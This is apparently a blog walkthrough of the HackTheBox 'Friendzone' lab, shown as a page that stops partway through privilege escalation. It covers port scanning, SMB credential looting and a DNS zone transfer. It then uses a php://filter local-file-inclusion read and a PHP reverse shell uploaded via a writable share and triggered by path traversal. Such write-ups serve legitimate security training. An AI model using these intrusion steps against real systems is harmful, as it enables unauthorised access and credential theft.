@@ -1,0 +1,781 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="author" content="Marco Meli">
+  <meta name="description" content="Friendzone | Recon masscan m4rc0ff@SittingDucks:~/Documents/htbBoxes$ sudo masscan -p1-65535 10.10.10.123 -e tun0 --rate=1000 [sudo] password for...">
+
+  <link rel="icon" type="image/png" href="/favicon-16x16.png" sizes="16x16">
+  <link rel="icon" type="image/png" href="/favicon-32x32.png" sizes="32x32">  
+  <link rel="icon" type="image/png" href="/favicon-96x96.png" sizes="96x96">
+  
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/css/bootstrap.min.css" type="text/css" media="all">
+  <link rel="stylesheet" href="https://sittingducks.io/theme/css/font.css" type="text/css" media="all">
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="https://sittingducks.io/theme/css/style.css" type="text/css" media="all">
+
+  
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js"></script>
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/js/bootstrap.min.js"></script>
+  <script type="text/javascript" src="https://sittingducks.io/theme/js/functions.min.js"></script>
+
+  <link href="https://sittingducks.io/theme/css/colorbox.css" rel="stylesheet">
+
+  <link href="https://fonts.googleapis.com/css?family=Squada+One|Source+Code+Pro|Merriweather:300|Abril+Fatface" rel="stylesheet">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+
+  <script src="/theme/tipuesearch/tipuesearch_set.js"></script>
+  <script src="/tipuesearch_content.js"></script>
+  <link rel="stylesheet" href="/theme/tipuesearch/tipuesearch.css">
+  <script src="/theme/tipuesearch/tipuesearch.js"></script>
+ 
+
+
+<meta name="keywords" content="HackTheBox">
+
+
+  <title>Friendzone</title>
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-156989597-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+  
+</head>
+
+<body class="home blog">
+  <div>
+    <header class="site-header">
+      <nav class="navbar navbar-default" role="navigation"> 
+	  
+		<form id="searchform" action="/search" onsubmit="return (this.elements['q'].value.length > 0)">
+		<input id="searchbox" type="text" name="q" size="12" placeholder="Search">
+		</form>
+		
+        <div class="container">
+          <div class="row">
+            <div class="site-navigation-inner col-sm-12">
+              <div class="navbar-header">
+                <button type="button" class="btn navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
+                  <span class="sr-only">Toggle navigation</span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                </button>
+              </div>
+              <div class="collapse navbar-collapse navbar-ex1-collapse">
+              <ul id="menu-all-pages" class="nav navbar-nav">
+                <li class="menu-item"><a href="htts://sittingducks.io" >home
+<i class="fa  fa-lg"></i></a></li>
+              </ul>
+              </div>
+              <div class="social">   
+                <a href="https://linkedin.com/in/marco-meli-12668530/" title="Linkedin" >
+<i class="fa fa-linkedin fa-lg"></i></a>
+                <a href="https://twitter.com/M4rC0ff" title="Twitter" >
+<i class="fa fa-twitter fa-lg"></i></a>
+                <a href="https://github.com/M4rc0ff" title="github" >
+<i class="fa fa-github fa-lg"></i></a>
+              </div>
+            </div>
+          </div>
+        </div>
+      </nav><!-- .site-navigation -->
+
+      <div class="container">
+      <div id="logo">
+        <span class="site-name"><a class="navbar-brand" href="https://sittingducks.io"><img width="310" src="../images/logo.png" class="attachment-full size-full" alt="logo">          </a>
+        </span><!-- end of .site-name -->
+      </div><!-- end of #logo -->
+        <div class="tagline">
+                <a href="https://sittingducks.io/tag/cheatsheets.html" >CheatSheets (1)</a> &#124; 
+                <a href="https://sittingducks.io/tag/hackthebox.html" >HackTheBox (32)</a> &#124; 
+                <a href="https://sittingducks.io/tag/vulnhub.html" >VulnHub (1)</a> &#124; 
+                <a href="https://sittingducks.io/archives.html" >Archives (34)</a>
+        </div>
+    </div>
+
+  </header><!-- #masthead -->
+  </div>
+    <div id="content" class="site-content">
+      <div class="container main-content-area">
+        <div class="row">
+          <div class="main-content-inner col-sm-12 col-md-12">
+            <div id="primary" class="content-area">
+              <div id="main" class="site-main" role="main">
+                <div class="article-container">
+<article>
+  <div class="blog-item-wrap">
+    <div class="post-inner-content">
+      <header class="entry-header page-header">
+        <span class="cat-item"><time datetime="2020-06-09 06:45:00+01:00">Tue 09 June 2020</time></span>
+        <h1 class="entry-title"><a href="https://sittingducks.io/Friendzone.html">Friendzone</a></h1>
+      </header><!-- .entry-header -->
+      <div class="fb-like" data-href="https://sittingducks.io/Friendzone.html" data-layout="standard" data-action="like" data-show-faces="false" data-share="true"></div>
+      <div class="entry-content">
+        <h1 id="recon">Recon</h1>
+<h3 id="masscan">masscan</h3>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~/Documents/htbBoxes$</span> sudo masscan -p1-65535 <span class="m">10</span>.10.10.123 -e tun0 --rate<span class="o">=</span><span class="m">1000</span>       
+<span class="go">[sudo] password for m4rc0ff:                                                                                                                                                                                                                                                                                           </span>
+<span class="go">Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-06-09 04:35:43 GMT</span>
+<span class="go"> -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth</span>
+<span class="go">Initiating SYN Stealth Scan      </span>
+<span class="go">Scanning 1 hosts [65535 ports/host]</span>
+<span class="go">Discovered open port 80/tcp on 10.10.10.123                                     </span>
+<span class="go">Discovered open port 445/tcp on 10.10.10.123                                                            </span>
+<span class="go">Discovered open port 139/tcp on 10.10.10.123                                    </span>
+<span class="go">Discovered open port 443/tcp on 10.10.10.123                                   </span>
+<span class="go">Discovered open port 53/tcp on 10.10.10.123                                                             </span>
+<span class="go">Discovered open port 22/tcp on 10.10.10.123                                    </span>
+<span class="go">Discovered open port 21/tcp on 10.10.10.123</span>
+</pre></div>
+
+
+<h3 id="nmap-detailed-scan-on-ports-found-by-masscan">nmap (detailed scan on ports found by masscan)</h3>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~/Documents/htbBoxes$</span> nmap -sV -sC -p80,445,139,443,53,22,21 <span class="m">10</span>.10.10.123
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-09 05:43 BST</span>
+<span class="go">Nmap scan report for 10.10.10.123</span>
+<span class="go">Host is up (0.096s latency).</span>
+
+<span class="go">PORT    STATE SERVICE     VERSION</span>
+<span class="go">21/tcp  open  ftp         vsftpd 3.0.3</span>
+<span class="go">22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)</span>
+<span class="go">| ssh-hostkey: </span>
+<span class="go">|   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA)</span>
+<span class="go">|   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA)</span>
+<span class="go">|_  256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519)</span>
+<span class="go">53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)</span>
+<span class="go">| dns-nsid: </span>
+<span class="go">|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu</span>
+<span class="go">80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))</span>
+<span class="go">|_http-server-header: Apache/2.4.29 (Ubuntu)</span>
+<span class="go">|_http-title: Friend Zone Escape software</span>
+<span class="go">139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span>
+<span class="go">443/tcp open  ssl/http    Apache httpd 2.4.29</span>
+<span class="go">|_http-server-header: Apache/2.4.29 (Ubuntu)</span>
+<span class="go">|_http-title: 404 Not Found</span>
+<span class="go">| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO</span>
+<span class="go">| Not valid before: 2018-10-05T21:02:30</span>
+<span class="go">|_Not valid after:  2018-11-04T21:02:30</span>
+<span class="go">|_ssl-date: TLS randomness does not represent time</span>
+<span class="go">| tls-alpn: </span>
+<span class="go">|_  http/1.1</span>
+<span class="go">445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)</span>
+<span class="go">Service Info: Hosts: FRIENDZONE, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span>
+
+<span class="go">Host script results:</span>
+<span class="go">|_clock-skew: mean: -1h02m42s, deviation: 1h43m54s, median: -2m43s</span>
+<span class="go">|_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span>
+<span class="go">| smb-os-discovery: </span>
+<span class="go">|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)</span>
+<span class="go">|   Computer name: friendzone</span>
+<span class="go">|   NetBIOS computer name: FRIENDZONE\x00</span>
+<span class="go">|   Domain name: \x00</span>
+<span class="go">|   FQDN: friendzone</span>
+<span class="go">|_  System time: 2020-06-09T07:41:25+03:00</span>
+<span class="go">| smb-security-mode: </span>
+<span class="go">|   account_used: guest</span>
+<span class="go">|   authentication_level: user</span>
+<span class="go">|   challenge_response: supported</span>
+<span class="go">|_  message_signing: disabled (dangerous, but default)</span>
+<span class="go">| smb2-security-mode: </span>
+<span class="go">|   2.02: </span>
+<span class="go">|_    Message signing enabled but not required</span>
+<span class="go">| smb2-time: </span>
+<span class="go">|   date: 2020-06-09T04:41:26</span>
+<span class="go">|_  start_date: N/A</span>
+
+<span class="go">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
+<span class="go">Nmap done: 1 IP address (1 host up) scanned in 23.15 seconds</span>
+</pre></div>
+
+
+<p><code>nmap</code> shows there are quite few services running in the box. This could be good as there could be many options for getting in, but it may also mean there could be rabbit holes that make us waste time. Hopefully not!</p>
+<p>I go straight to some SMB enumeration. The <code>nmap</code> showed that the guest access is enabled so I can use the below <code>smbmap</code> command with a random password:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> smbmap -u guest -H <span class="m">10</span>.10.10.123
+<span class="go">[+] Guest session       IP: 10.10.10.123:445    Name: friendzone.red                                    </span>
+<span class="go">        Disk                                                    Permissions     Comment</span>
+<span class="go">        ----                                                    -----------     -------</span>
+<span class="go">        print$                                                  NO ACCESS       Printer Drivers</span>
+<span class="go">        Files                                                   NO ACCESS       FriendZone Samba Server Files /etc/Files</span>
+<span class="go">        general                                                 READ ONLY       FriendZone Samba Server Files</span>
+<span class="go">        Development                                             READ, WRITE     FriendZone Samba Server Files</span>
+<span class="go">        IPC$                                                    NO ACCESS       IPC Service (FriendZone server (Samba, Ubuntu))</span>
+</pre></div>
+
+
+<p>The above output is very useful as it tells us we have read access upon the <code>general</code> share and read/write access upon the <code>development</code> share. Let's see what's inside:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> smbclient -U guest //10.10.10.123/general
+<span class="go">Enter WORKGROUP\guest&#39;s password: </span>
+<span class="go">Try &quot;help&quot; to get a list of possible commands.</span>
+<span class="go">smb: \&gt; dir</span>
+<span class="go">  .                                   D        0  Wed Jan 16 20:10:51 2019</span>
+<span class="go">  ..                                  D        0  Wed Jan 23 21:51:02 2019</span>
+<span class="go">  creds.txt                           N       57  Wed Oct 10 00:52:42 2018</span>
+
+<span class="go">                9221460 blocks of size 1024. 6460280 blocks available</span>
+<span class="go">smb: \&gt; get creds.txt</span>
+<span class="go">getting file \creds.txt of size 57 as creds.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)</span>
+</pre></div>
+
+
+<p>I found the <code>creds.txt</code> file in the <code>general</code> share and once downloaded it to my box I can see it contains some credentials although I am not sure yet what they are for:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~/Documents/htbBoxes/friendzone$</span> cat creds.txt 
+<span class="go">creds for the admin THING:</span>
+
+<span class="gp">admin:WORKWORKHhallelujah@#</span>
+</pre></div>
+
+
+<p>I did not find anything in the <code>Develpment</code> share:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~/Documents/htbBoxes/friendzone$</span> smbclient -U guest //10.10.10.123/development
+<span class="go">Enter WORKGROUP\guest&#39;s password: </span>
+<span class="go">Try &quot;help&quot; to get a list of possible commands.</span>
+<span class="go">smb: \&gt; dir</span>
+<span class="go">  .                                   D        0  Wed Jun 10 12:21:40 2020</span>
+<span class="go">  ..                                  D        0  Wed Jan 23 21:51:02 2019</span>
+
+<span class="go">                9221460 blocks of size 1024. 6460280 blocks available</span>
+<span class="go">smb: \&gt;</span>
+</pre></div>
+
+
+<p>One thing I notice is that the SSL cert shown in the <code>nmap</code> output has <code>friendzone.red</code> as the commonName, so I will add this to my <code>/ets/hosts</code> file indicating to resolve to the IP of the box (<code>10.10.10.123</code>).</p>
+<p>The webpage on <code>http://10.10.10.123</code> shows this:</p>
+<p><img alt="" src="../images/friendzone-port80.png"></p>
+<p>This gives us clues of another potential domain which I also add to my <code>/etc/hosts</code> file. Looking at the two domains found so far we can see this:</p>
+<p><img alt="" src="../images/friendzone-red.png"></p>
+<p>the html source for the above page shows some comments hinting to check the <code>/js/js</code> subdirectory:</p>
+<div class="highlight"><pre><span></span><span class="c">&lt;!-- Just doing some development here --&gt;</span>
+<span class="c">&lt;!-- /js/js --&gt;</span>
+<span class="c">&lt;!-- Don&#39;t go deep ;) --&gt;</span>
+</pre></div>
+
+
+<p>upon checking I see this</p>
+<p><img alt="" src="../images/friendzone-js.png"></p>
+<p>if I refresh the page the string changes meaning there is some kind of code behind that generates it. The source code of this page shows another comment:</p>
+<div class="highlight"><pre><span></span><span class="c">&lt;!-- dont stare too much , you will be smashed ! , it&#39;s all about times and zones ! --&gt;</span>
+</pre></div>
+
+
+<p>Note sure about <code>time</code> to be honest but I wanted to try anyway a DNS <code>zone</code> transfer as it may lead to further information. Before doing so let's look ad the other webpage:</p>
+<p><img alt="" src="../images/friendzone-mj.png"></p>
+<p>The source code does not show anything interesting. So let's try the zone transfer:</p>
+<h4 id="friendzonered-zone-transfer">friendzone.red zone transfer</h4>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> host -l friendzone.red <span class="m">10</span>.10.10.123
+<span class="go">Using domain server:</span>
+<span class="go">Name: 10.10.10.123</span>
+<span class="go">Address: 10.10.10.123#53</span>
+<span class="go">Aliases: </span>
+
+<span class="go">friendzone.red has IPv6 address ::1</span>
+<span class="go">friendzone.red name server localhost.</span>
+<span class="go">friendzone.red has address 127.0.0.1</span>
+<span class="go">administrator1.friendzone.red has address 127.0.0.1</span>
+<span class="go">hr.friendzone.red has address 127.0.0.1</span>
+<span class="go">uploads.friendzone.red has address 127.0.0.1</span>
+</pre></div>
+
+
+<h4 id="friendzoneportalred-zone-transfer">friendzoneportal.red zone transfer</h4>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> host -l friendzoneportal.red <span class="m">10</span>.10.10.123
+<span class="go">Using domain server:</span>
+<span class="go">Name: 10.10.10.123</span>
+<span class="go">Address: 10.10.10.123#53</span>
+<span class="go">Aliases: </span>
+
+<span class="go">friendzoneportal.red has IPv6 address ::1</span>
+<span class="go">friendzoneportal.red name server localhost.</span>
+<span class="go">friendzoneportal.red has address 127.0.0.1</span>
+<span class="go">admin.friendzoneportal.red has address 127.0.0.1</span>
+<span class="go">files.friendzoneportal.red has address 127.0.0.1</span>
+<span class="go">imports.friendzoneportal.red has address 127.0.0.1</span>
+<span class="go">vpn.friendzoneportal.red has address 127.0.0.1</span>
+</pre></div>
+
+
+<p>Wow these are a lot of entries! I add them all to my <code>/etc/hosts</code> file and start having a look.</p>
+<p>Visiting <code>https://administrator1.friendzone.red</code> yields this result:</p>
+<p><img alt="" src="../images/friendzone-administrator1.png"></p>
+<p>so I tried the credentials found earlier (<code>admin:WORKWORKHhallelujah@#</code>) which worked and I am presented with this page:</p>
+<p><img alt="" src="../images/friendzone-administrator1-login.png"></p>
+<p>so I go the the address suggested:</p>
+<p><img alt="" src="../images/friendzone-dashboard.png"></p>
+<p>Here I am told the <code>image_name</code> param is missing and I need to add it manually, so I do as instructed:</p>
+<p><img alt="" src="../images/friendzone-image_name.png"></p>
+<p>Ok. Now the URL is a good candiate for an LFI (Local File Inclusion) vulnerability. I suspect <code>timestamp</code> is a PHP file (containing a timestamp function) that is being included, that is the file is present on a directory and we are able to call it from the URL. This suspect is enforced by the hint I saw earlier that stated "it's all about times and zones". I think it would be interesting at this stage to see if we find any other files that we could potentially include, so I give it a go with <code>gobuster</code>:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> gobuster dir -u https://administrator1.friendzone.red -w /usr/share/dirbuster/wo
+<span class="go">rdlists/directory-list-2.3-medium.txt -x php -t 30 -k</span>
+<span class="go">===============================================================</span>
+<span class="go">Gobuster v3.0.1</span>
+<span class="go">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span>
+<span class="go">===============================================================</span>
+<span class="go">[+] Url:            https://administrator1.friendzone.red</span>
+<span class="go">[+] Threads:        30</span>
+<span class="go">[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt</span>
+<span class="go">[+] Status codes:   200,204,301,302,307,401,403</span>
+<span class="go">[+] User Agent:     gobuster/3.0.1</span>
+<span class="go">[+] Extensions:     php</span>
+<span class="go">[+] Timeout:        10s</span>
+<span class="go">===============================================================</span>
+<span class="go">2020/06/09 15:54:42 Starting gobuster</span>
+<span class="go">===============================================================</span>
+<span class="go">/images (Status: 301)</span>
+<span class="go">/login.php (Status: 200)</span>
+<span class="go">/dashboard.php (Status: 200)</span>
+<span class="go">/timestamp.php (Status: 200)</span>
+<span class="go">/server-status (Status: 403)</span>
+</pre></div>
+
+
+<p>The above output shows that indeed we have a <code>timestamp.php</code> file. So I try to "include" <code>login</code> instead of <code>timestampt</code> in the URL and I get this:</p>
+<p><img alt="" src="../images/friendzone-login-wrong.png"></p>
+<p>Including <code>dashboard.php</code> won't be useful as it will create a loop. Additionally, I won't be able to include some other local files such as <code>/etc/passwd</code> because only files with PHP extension work. We can see this because when we include <code>timestamp.php</code> we actually add <code>timestamp</code> in the URL without the <code>.php</code> extension. This is likely to be something similar to this:</p>
+<div class="highlight"><pre><span></span><span class="x">include($_GET[&quot;pagename&quot;] . &quot;.php&quot;)</span>
+</pre></div>
+
+
+<p>So the server expects the file name without the extension in the URL but in the backend the same file with the PHP extension will be called. This is why if we try to include <code>/etc/passwd</code> the server will look for a file named <code>/etc/passwd.php</code> which of course does not exist, no matter how many dots we add to get the right location, i.e. <code>../../../etc/passwd</code>. </p>
+<p>If we want to see the actual PHP code of <code>timestamp.php</code> or <code>login.php</code> for instance, we can try a technique using the <a href="https://www.php.net/manual/en/wrappers.php.php">php://filter wrapper</a>. </p>
+<p>Specifically the wrapper would allow us to include the <code>login</code> PHP file and base64-encode it as follow:</p>
+<p><code>php://filter/convert.base64-encode/resource=login</code> </p>
+<p><img alt="" src="../images/friendzone-base64login.png"></p>
+<p>So once I do it I get a long base64 string which I copy to my kali box and decode it:</p>
+<div class="highlight"><pre><span></span><span class="x">m4rc0ff@SittingDucks:~$ echo PD9waHAKCgokdXNlcm5hbWUgPSAkX1BPU1RbInVzZXJuYW1lIl07CiRwYXNzd29yZCA9ICRfUE9TVFsicGFzc3dvcmQiXTsKCi8vZWNobyAkdXNlcm5hbWUgPT09ICJhZG1pbiI7Ci8vZWNobyBzdHJjbXAoJHVzZXJuYW1lLCJhZG1pbiIpOwoKaWYgKCR1c2VybmFtZT09PSJhZG1pbiIgYW5kICRwYXNzd29yZD09PSJXT1JLV09SS0hoYWxsZWx1amFoQCMiKXsKCnNldGNvb2tpZSgiRnJpZW5kWm9uZUF1dGgiLCAiZTc3NDlkMGY0YjRkYTVkMDNlNmU5MTk2ZmQxZDE4ZjEiLCB0aW1lKCkgKyAoODY0MDAgKiAzMCkpOyAvLyA4NjQwMCA9IDEgZGF5CgplY2hvICJMb2dpbiBEb25lICEgdmlzaXQgL2Rhc2hib2FyZC5waHAiOwp9ZWxzZXsKZWNobyAiV3JvbmcgISI7Cn0KCgoKPz4K |base64 -d</span>
+<span class="cp">&lt;?php</span>
+
+
+<span class="nv">$username</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">&quot;username&quot;</span><span class="p">];</span>
+<span class="nv">$password</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">&quot;password&quot;</span><span class="p">];</span>
+
+<span class="c1">//echo $username === &quot;admin&quot;;</span>
+<span class="c1">//echo strcmp($username,&quot;admin&quot;);</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="nv">$username</span><span class="o">===</span><span class="s2">&quot;admin&quot;</span> <span class="k">and</span> <span class="nv">$password</span><span class="o">===</span><span class="s2">&quot;WORKWORKHhallelujah@#&quot;</span><span class="p">){</span>
+
+<span class="nb">setcookie</span><span class="p">(</span><span class="s2">&quot;FriendZoneAuth&quot;</span><span class="p">,</span> <span class="s2">&quot;e7749d0f4b4da5d03e6e9196fd1d18f1&quot;</span><span class="p">,</span> <span class="nb">time</span><span class="p">()</span> <span class="o">+</span> <span class="p">(</span><span class="mi">86400</span> <span class="o">*</span> <span class="mi">30</span><span class="p">));</span> <span class="c1">// 86400 = 1 day</span>
+
+<span class="k">echo</span> <span class="s2">&quot;Login Done ! visit /dashboard.php&quot;</span><span class="p">;</span>
+<span class="p">}</span><span class="k">else</span><span class="p">{</span>
+<span class="k">echo</span> <span class="s2">&quot;Wrong !&quot;</span><span class="p">;</span>
+<span class="p">}</span>
+
+
+
+<span class="cp">?&gt;</span><span class="x"></span>
+</pre></div>
+
+
+<p>As shown above, the code expects the right credentials after which it will set the cookies and print "Login Done ! visit /dashboard.php". Else if the credentials are wrong it prints "Wrong!". </p>
+<p>With the same process we can also see the other files but I think the most important was this. </p>
+<p>Now, what we really need is a way to upload a php shell code into the same place where <code>login.php</code> and <code>timestamp.php</code> are located. This way we can execute it and get a reverse shell. </p>
+<p>There is one place where I am able to write, that is the <code>Development</code> share shown by the <code>smbmap</code> output. </p>
+<p><code>smbmap</code> also showed something very useful:</p>
+<div class="highlight"><pre><span></span><span class="go">Files                                                   NO ACCESS       FriendZone Samba Server Files /etc/Files</span>
+</pre></div>
+
+
+<p>The <code>Files</code> share (for which we don't have access) is located at <code>/etc/Files</code>. So there is a good chance the <code>Development</code> share is located at <code>/etc/Development</code>. So let's assume this is true for now.</p>
+<p>Also let us assume that webpages are hosted in the default apache directory, that is <code>/var/www/html</code>. If this is true we should be able to place a php file into <code>/etc/Development</code> and we should be able to include it jumping 3 directories up as follow:</p>
+<ul>
+<li>
+<p>from <code>/var/www/html</code> to <code>/etc/Development</code> we can do this:</p>
+<p><code>../../../etc/</code></p>
+</li>
+</ul>
+<p>Let's try that.</p>
+<div class="highlight"><pre><span></span><span class="x">&lt;html&gt;</span>
+<span class="x"> &lt;head&gt;</span>
+<span class="x">  &lt;title&gt;PHP Test&lt;/title&gt;</span>
+<span class="x"> &lt;/head&gt;</span>
+<span class="x"> &lt;body&gt;</span>
+<span class="x"> </span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="s1">&#39;&lt;p&gt;Hey SittingDucks!&lt;/p&gt;&#39;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"> </span>
+<span class="x"> &lt;/body&gt;</span>
+<span class="x">&lt;/html&gt;</span>
+</pre></div>
+
+
+<p>I create a file called <code>test.php</code> containing the above code and I place it to <code>/etc/development</code></p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~/Documents/htbBoxes/friendzone$</span> smbclient -U guest //10.10.10.123/development
+<span class="go">Enter WORKGROUP\guest&#39;s password: </span>
+<span class="go">Try &quot;help&quot; to get a list of possible commands.</span>
+<span class="go">smb: \&gt; put test.php</span>
+<span class="go">putting file test.php as \test.php (0.4 kb/s) (average 0.4 kb/s)</span>
+<span class="go">smb: \&gt; dir</span>
+<span class="go">  .                                   D        0  Wed Jun 10 18:08:26 2020</span>
+<span class="go">  ..                                  D        0  Wed Jan 23 21:51:02 2019</span>
+<span class="go">  test.php                            A      119  Wed Jun 10 18:08:26 2020</span>
+
+<span class="go">                9221460 blocks of size 1024. 6460100 blocks available</span>
+</pre></div>
+
+
+<p>Now if the above assumptions are tru we should be able to get the text "hey SittingDucks!" when including the <code>test</code> PHP file:</p>
+<p><img alt="" src="../images/friendzone-LFItested.png"></p>
+<p>It worked, so the assumtions were correct. We now have code execution and we can therefore upload a PHP reverse shell using the same procedure.</p>
+<p>For this I will use a php reverse shell available in kali, that is <code>/usr/share/laudanum/php/php-reverse-shell.php</code>. I copied the shell into a file named is <code>shell.php</code>.</p>
+<p>I modify the shell details adding my IP and port as follow:</p>
+<div class="highlight"><pre><span></span><span class="x">$ip = &#39;10.10.14.29&#39;;  // CHANGE THIS</span>
+<span class="x">$port = 443;       // CHANGE THIS</span>
+</pre></div>
+
+
+<p>Then I push the shell to the <code>Development</code> share as I did for the <code>test.php</code> file and at the same time I start a netcat listener on my kali boc on port 443. </p>
+<p>Once I hit this address <code>https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&amp;pagename=../../../etc/Development/shell</code> in the browser I get my shell back as the <code>www-data</code> user:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> sudo nc -lnvp <span class="m">443</span>
+<span class="go">[sudo] password for m4rc0ff: </span>
+<span class="go">listening on [any] 443 ...</span>
+<span class="go">connect to [10.10.14.29] from (UNKNOWN) [10.10.10.123] 56608</span>
+<span class="go">Linux FriendZone 4.15.0-36-generic #39-Ubuntu SMP Mon Sep 24 16:19:09 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span>
+<span class="go"> 20:25:42 up  8:55,  0 users,  load average: 0.00, 0.00, 0.00</span>
+<span class="go">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span>
+<span class="go">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
+<span class="go">/bin/sh: 0: can&#39;t access tty; job control turned off</span>
+<span class="gp">$</span>
+</pre></div>
+
+
+<p>after upgrading to a full interactive shell using the procedure outlined <a href="https://sittingducks.io/From%20basic%20shell%20to%20fully%20interactive.html">here</a> I was able to grab the <code>user.txt</code> flag:</p>
+<div class="highlight"><pre><span></span><span class="gp">www-data@FriendZone:/home/friend$</span> cat user.txt
+<span class="go">a9****************************11</span>
+</pre></div>
+
+
+<h2 id="privesc-www-data-friend">Privesc <code>www-data</code> --&gt; <code>friend</code></h2>
+<p>I start exploring folders and <code>/var/www</code> contains a conf file containing database credentials:</p>
+<div class="highlight"><pre><span></span><span class="gp">www-data@FriendZone:/var/www$</span> ls -l
+<span class="go">total 28</span>
+<span class="go">drwxr-xr-x 3 root root 4096 Jan 16  2019 admin</span>
+<span class="go">drwxr-xr-x 4 root root 4096 Oct  6  2018 friendzone</span>
+<span class="go">drwxr-xr-x 2 root root 4096 Oct  6  2018 friendzoneportal</span>
+<span class="go">drwxr-xr-x 2 root root 4096 Jan 15  2019 friendzoneportaladmin</span>
+<span class="go">drwxr-xr-x 3 root root 4096 Oct  6  2018 html</span>
+<span class="go">-rw-r--r-- 1 root root  116 Oct  6  2018 mysql_data.conf</span>
+<span class="go">drwxr-xr-x 3 root root 4096 Oct  6  2018 uploads</span>
+<span class="gp">www-data@FriendZone:/var/www$</span> cat mysql_data.conf 
+<span class="go">for development process this is the mysql creds for user friend</span>
+
+<span class="go">db_user=friend</span>
+
+<span class="go">db_pass=Agpyu12!0.213$</span>
+
+<span class="go">db_name=FZ</span>
+</pre></div>
+
+
+<p>I try these credentials to login with the user friend and they worked:</p>
+<div class="highlight"><pre><span></span><span class="gp">www-data@FriendZone:/var/www$</span> su - friend
+<span class="go">Password: </span>
+<span class="gp">friend@FriendZone:~$</span> whoami
+<span class="go">friend</span>
+</pre></div>
+
+
+<h2 id="privesc-friend-root">Privesc  <code>friend</code> --&gt; <code>root</code></h2>
+<p>I wanted to run <a href="https://github.com/rebootuser/LinEnum">LinEnum.sh</a> without downloading it to the box using <code>curl</code> but I noticed <code>curl</code> is not installed in the box. So I download <code>LinEnum.sh</code> to the box in <code>/tmp</code> using <code>wget</code>.</p>
+<p>I see this regarding the user <code>friend</code> group membership:</p>
+<div class="highlight"><pre><span></span><span class="c1">### USER/GROUP ##########################################                                                                                                                             </span>
+<span class="o">[</span>-<span class="o">]</span> Current user/group info:                                                                                                                                                          
